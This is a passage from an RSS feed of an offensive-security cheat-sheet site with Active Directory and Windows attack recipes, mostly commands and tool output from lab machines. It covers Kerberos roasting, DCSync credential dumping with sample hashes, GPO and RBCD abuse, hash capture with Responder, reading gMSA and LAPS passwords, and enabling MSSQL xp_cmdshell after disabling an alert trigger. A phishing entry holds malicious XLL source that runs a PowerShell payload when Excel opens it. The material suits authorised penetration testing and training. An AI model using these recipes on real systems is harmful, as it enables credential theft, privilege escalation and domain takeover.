      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
    </item>
    <item>
      <title>GetChanges/GetChangesAll</title>
      <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
      <description>Abuse #1: DCSync Attack Linux Windows # With creds impacket-secretsdump -just-dc &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -just-dc &amp;#39;mrlky:Football#7@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: ...[SNIP]... [*] Cleaning up... # With hashes impacket-secretsdump -hashes :&amp;lt;HASH&amp;gt; -just-dc &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -hashes :bceef4f6fe9c026d1d8dec8dce48adef -just-dc &amp;#39;sizzle.htb/mrlky@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.</description>
    </item>
    <item>
      <title>GPOs</title>
      <link>https://tldrbins.github.io/gpos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/gpos/</guid>
      <description>Abuse #1: Add local admin 1. List GPOs Name Get-GPO -All | Select-Object DisplayName *Evil-WinRM* PS C:\Users\HHogan\Documents&amp;gt; Get-GPO -All | Select-Object DisplayName DisplayName ----------- Windows Firewall GPO Default Domain Policy Default Active Directory Settings GPO Default Domain Controllers Policy Windows Update GPO Windows Update Domain Policy Software Installation GPO Password Policy GPO 2. Add localAdmin .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; --GPOName &amp;#39;&amp;lt;GPO_NAME&amp;gt;&amp;#39; *Evil-WinRM* PS C:\Users\HHogan\Documents&amp;gt; .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &amp;#39;HHogan&amp;#39; --GPOName &amp;#39;Default Domain Policy&amp;#39; [+] Domain = office.</description>
    </item>
    <item>
      <title>IIS</title>
      <link>https://tldrbins.github.io/iis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/iis/</guid>
      <description>IIS Version +---------------------------------------------------------------------------------+ | Version Start Date End Date | +---------------------------------------------------------------------------------+ | IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | | IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | | IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027 | | IIS 10 on Windows 10 Pro Jul 29, 2015 | | IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | | IIS 8.</description>
    </item>
    <item>
      <title>Kerberoasting</title>
      <link>https://tldrbins.github.io/roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/roasting/</guid>
      <description>AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile &amp;lt;USERS_FILE&amp;gt; -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; $ impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [-] User j.roberts doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User m.chaffrey doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User s.osvald doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$d.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea$7288c91ca ...[SNIP]... 0e09c5d9d1 [-] User j.robinson doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User n.smith doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set # Single user without creds impacket-GetNPUsers -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; $ impacket-GetNPUsers -no-pass -dc-ip 10.</description>
    </item>
    <item>
      <title>Kerberos</title>
      <link>https://tldrbins.github.io/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kerberos/</guid>
      <description>Usernames enum kerbrute kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERNAMES_FILE&amp;gt; $ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop 2024/09/24 14:54:41 &amp;gt; Using KDC(s): 2024/09/24 14:54:41 &amp;gt; dc.</description>
    </item>
    <item>
      <title>Krbrelayx</title>
      <link>https://tldrbins.github.io/krbrelayx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/krbrelayx/</guid>
      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 $ sudo responder -I tun0 ...[SNIP]... [+] Listening for events... [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:d7c67a8cpython3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --action add --record &amp;lt;TARGET_RECORD&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;TARGET_IP&amp;gt; $ python3 dnstool.py -u &amp;#39;intelligence\Tiffany.Molina&amp;#39; -p &amp;#39;NewIntelligenceCorpUser9876&amp;#39; --action add --record web-test --data 10.10.14.31 10.</description>
    </item>
    <item>
      <title>LDAP</title>
      <link>https://tldrbins.github.io/ldap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ldap/</guid>
      <description>Enum ldapsearch ldapdomaindump nmap # Get domain base ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -D &amp;#34;CN=&amp;lt;USER&amp;gt;,CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#34; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With creds ldapdomaindump -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -o ./ldap # Using nmap script sudo nmap -p 389 --script ldap-search &amp;lt;TARGET&amp;gt; Enum with Kerberos ldapsearch nxc # Add GSSAPI sudo apt install libsasl2-modules-gssapi-mit ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -Y GSSAPI -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With kerberos nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --users </description>
    </item>
    <item>
      <title>Machine Account</title>
      <link>https://tldrbins.github.io/machine_account/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/machine_account/</guid>
      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt PS C:\programdata&amp;gt; .\rubeus.exe tgtdeleg /nowrap /ptt ______ _ (_____ \ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \| ___ | | | |/___) | | \ \| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.2 [*] Action: Request Fake Delegation TGT (current user) [*] No target SPN specified, attempting to build &amp;#39;cifs/dc.</description>
    </item>
    <item>
      <title>Metasploit</title>
      <link>https://tldrbins.github.io/metasploit/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/metasploit/</guid>
      <description>msfconsole meterpreter Start msfconsole msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts &amp;lt;TARGET&amp;gt; set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
    </item>
    <item>
      <title>Microsoft Access Database</title>
      <link>https://tldrbins.github.io/microsoft_access_database/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/microsoft_access_database/</guid>
      <description>Tools mdbtools sudo apt install mdbtools Basic # Show all tables mdb-tables &amp;lt;MDB_FILE&amp;gt; $ mdb-tables backup.mdb acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock ...[SNIP]... # Show tables with data mdb-tables &amp;lt;MDB_FILE&amp;gt; | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep . | while read table; do lines=$(mdb-export &amp;lt;MDB_FILE&amp;gt; $table | wc -l); if [ $lines -gt 1 ]; then echo &amp;#34;$table: $lines&amp;#34;; fi; done $ mdb-tables backup.mdb | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep .</description>
    </item>
    <item>
      <title>Microsoft Oulook Email Folder</title>
      <link>https://tldrbins.github.io/microsoft_outlook/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/microsoft_outlook/</guid>
      <description>Open email file .pst .msg Tools sudo apt install readpst Basic # Convert to mbox format readpst &amp;#39;&amp;lt;PST_FILE&amp;gt;&amp;#39; $ readpst &amp;#39;Access Control.pst&amp;#39; Opening PST file and indexes... Processing Folder &amp;#34;Deleted Items&amp;#34; &amp;#34;Access Control&amp;#34; - 2 items done, 0 items skipped. # Open .mbox (plaintext) cat &amp;#39;&amp;lt;MBOX_FILE&amp;gt;&amp;#39; $ cat &amp;#39;Access Control.mbox&amp;#39; From &amp;#34;john@megacorp.com&amp;#34; Fri Aug 24 07:44:07 2018 Status: RO From: john@megacorp.com &amp;lt;john@megacorp.com&amp;gt; Subject: MegaCorp Access Control System &amp;#34;security&amp;#34; account To: &amp;#39;security@accesscontrolsystems.</description>
    </item>
    <item>
      <title>MSSQL Agent Jobs</title>
      <link>https://tldrbins.github.io/mssql_agent_jobs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_agent_jobs/</guid>
      <description>1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Fix : Cannot resolve the collation conflict between &amp;#34;Latin1_General_CI_AI&amp;#34; and &amp;#34;SQL_Latin1_General_CP1_CI_AS&amp;#34; SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN=&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;; INSERT proxies EXEC msdb.</description>
    </item>
    <item>
      <title>MSSQL General</title>
      <link>https://tldrbins.github.io/mssql_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_general/</guid>
      <description>General Connect to MSSQL DB Linux Windows impacket-mssqlclient &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Without TLS impacket-mssqlclient -windows-auth &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # With inline query sqlcmd -S &amp;lt;TARGET&amp;gt; -U &amp;lt;USER&amp;gt; -P &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DB_NAME&amp;gt; -Q &amp;#34;SELECT @@version;&amp;#34; Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.</description>
    </item>
    <item>
      <title>MSSQL Linked Servers</title>
      <link>https://tldrbins.github.io/mssql_linked_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
      <description>Basic Commands Hint: Use double &amp;apos;&amp;apos; to escape &amp;apos; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; # Show linked servers enum_links Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN &amp;lt;USER&amp;gt; WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;EXEC sp_addsrvrolemember &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;sysadmin&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] </description>
    </item>
    <item>
      <title>MSSQL Privilege Escalation</title>
      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
      <description>Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 Method 1 Method 2 Method 3 xp_dirtree &amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;; use master; exec xp_dirtree &amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;; load_file(&amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Abuse #3: Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
    </item>
    <item>
      <title>NetExec (nxc)</title>
      <link>https://tldrbins.github.io/nxc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/nxc/</guid>
      <description>Basic Commands # Single user and password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Single user and password (Active Directory) nxc &amp;lt;PROTOCOL&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; &amp;lt;TARGET&amp;gt; # Multiple users or passwords nxc &amp;lt;PROTOCOL&amp;gt; -u &amp;lt;USERNAMES&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; &amp;lt;TARGET&amp;gt; --continue-on-success # Match username to corresponding password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USERNAMES&amp;gt; -p &amp;lt;PASSWORDS&amp;gt; --no-bruteforce --continue-on-success # With hash nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;LM&amp;gt;:&amp;lt;NT&amp;gt; # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) nxc &amp;lt;PROTOCOL&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k &amp;lt;TARGET&amp;gt; Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+ RID Brute nxc smb &amp;lt;TARGET&amp;gt; -u guest -p &amp;#39;&amp;#39; --rid-brute 10000 User Enum (Authenticated) nxc smb &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; --users Ref: Download nxc</description>
    </item>
    <item>
      <title>NTLM Relay Attack</title>
      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
      <description>NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Expand-Archive -Path &amp;#34;&amp;lt;SOCAT_ZIP_FILE_PATH&amp;gt;&amp;#34; -DestinationPath &amp;#34;&amp;lt;DEST_PATH&amp;gt;&amp;#34; -Force PS C:\xampp\htdocs&amp;gt; Expand-Archive -Path &amp;#34;C:\xampp\htdocs\socat.zip&amp;#34; -DestinationPath &amp;#34;C:\xampp\htdocs\&amp;#34; -Force .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 PS C:\xampp\htdocs\socat-windows-master&amp;gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80 0 [main] socat 2084 find_fast_cwd: WARNING: Couldn&amp;#39;t compute FAST_CWD pointer. Please report this problem to the public mailing list cygwin@cygwin.com Ref: socat&#xA;2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.</description>
    </item>
    <item>
      <title>Phishing</title>
      <link>https://tldrbins.github.io/phishing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/phishing/</guid>
      <description>lnk xll hta scf odt pdf others $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
    </item>
    <item>
      <title>RBCD Attack</title>
      <link>https://tldrbins.github.io/rbcd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rbcd/</guid>
      <description>RBCD Attack Linux Windows 0. Check machine account quota nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M maq $ nxc ldap example.com -u &amp;#39;test.user&amp;#39; -p &amp;#39;Test1234&amp;#39; -M maq SMB 10.10.11.10 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:False) LDAP 10.10.11.10 389 DC [+] example.com\test.user:Test1234 MAQ 10.10.11.10 389 DC [*] Getting the MachineAccountQuota MAQ 10.10.11.10 389 DC MachineAccountQuota: 10 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;Test1234&amp;#39; -dc-ip 10.</description>
    </item>
    <item>
      <title>ReadGMSAPassword</title>
      <link>https://tldrbins.github.io/readgmsapassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readgmsapassword/</guid>
      <description>Abuse #1: Read GMSAPassword (From Linux) gMSADumper BloodyAD nxc python3 gMSADumper.py -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -l &amp;lt;DC&amp;gt; -d &amp;lt;DOMAIN&amp;gt; $ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb Users or groups who can read password for svc_int$: &amp;gt; DC$ &amp;gt; itsupport svc_int$:::745bd2c68dfc101a74f48d87027c7dc6 svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd92849c150d4ed43f1056f svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3 Ref: gMSADumper&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; get object &amp;#39;&amp;lt;TARGET_OBJECT&amp;gt;&amp;#39; --attr msDS-ManagedPassword $ python3 bloodyAD.py -d intelligence.htb -u ted.graves -p &amp;#39;Mr.</description>
    </item>
    <item>
      <title>ReadLAPSPassword</title>
      <link>https://tldrbins.github.io/readlapspassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readlapspassword/</guid>
      <description>Abuse #1: Read LAPS Password Linux Windows ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd $ ldapsearch -H ldap://10.10.10.240 -b &amp;#39;DC=LicorDeBellota,DC=HTB&amp;#39; -x -D bob@LicorDeBellota.htb -w &amp;#39;Test1234!@&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd # extended LDIF # # LDAPv3 # base &amp;lt;DC=LicorDeBellota,DC=HTB&amp;gt; with scope subtree # filter: (ms-MCS-AdmPwd=*) # requesting: ms-MCS-AdmPwd # # PIVOTAPI, Domain Controllers, LicorDeBellota.htb dn: CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb ms-Mcs-AdmPwd: 2Vf5kP4Xvj5r605V616x # search reference ref: ldap://ForestDnsZones.LicorDeBellota.htb/DC=ForestDnsZones,DC=LicorDeBell ota,DC=htb # search reference ref: ldap://DomainDnsZones.</description>
    </item>
    <item>
      <title>RPC</title>
      <link>https://tldrbins.github.io/rpc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rpc/</guid>
      <description>Remote Procedure Call Tools rpcclient impacket # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N &amp;lt;TARGET&amp;gt; $ rpcclient -U &amp;#39;&amp;#39; -N 10.10.10.172 rpcclient $&amp;gt; # Connect with creds rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Inline execute command rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo rpcclient $&amp;gt; querydispinfo index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2 Name: AAD_987d7f2f57d2 Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.</description>
    </item>
    <item>
      <title>Runas</title>
      <link>https://tldrbins.github.io/runas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/runas/</guid>
